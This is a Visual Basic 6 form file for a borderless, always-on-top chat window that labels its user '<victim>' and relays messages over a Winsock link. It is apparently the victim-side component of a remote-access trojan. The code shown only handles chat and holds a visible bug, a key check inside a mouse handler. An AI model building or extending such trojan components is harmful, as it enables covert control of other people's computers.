VERSION 5.00
Begin VB.Form frmServerChat 
   BorderStyle     =   0  'None
   Caption         =   "Form2"
   ClientHeight    =   3135
   ClientLeft      =   11745
   ClientTop       =   960
   ClientWidth     =   4335
   LinkTopic       =   "Form2"
   ScaleHeight     =   3135
   ScaleWidth      =   4335
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command1 
      Caption         =   "&send"
      Height          =   375
      Left            =   3360
      TabIndex        =   2
      Top             =   2640
      Width           =   855
   End
   Begin VB.TextBox txtmsg 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   255
      HideSelection   =   0   'False
      Left            =   120
      TabIndex        =   1
      Top             =   2720
      Width           =   3135
   End
   Begin VB.TextBox txtchat 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   2415
      HideSelection   =   0   'False
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   120
      Width           =   4095
   End
End
Attribute VB_Name = "frmServerChat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
If txtmsg.Text = "" Then Exit Sub
txtchat.Text = txtchat.Text & "<victim>" & txtmsg.Text & vbCrLf
frmServer.WS.SendData "ChatMessage;" & txtchat.Text
End Sub

Private Sub Form_Load()
StayOnTop frmServerChat
End Sub

Private Sub txtchat_Change()
On Error Resume Next
    txtchat.SelLength = 0


    If Len(txtchat.Text) > 0 Then


        If Right$(txtchat.Text, 1) = vbCrLf Then
            txtchat.SelStart = Len(txtchat.Text) - 1
            Exit Sub
        End If
        txtchat.SelStart = Len(txtchat.Text)
    End If
End Sub

Private Sub txtmsg_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If txtmsg.Text = "" Then Exit Sub
If KeyCode = 13 Then
txtchat.Text = txtchat.Text & "<victim>" & txtmsg.Text & vbCrLf
frmServer.WS.SendData "ChatMessage;" & txtchat.Text
End If
End Sub
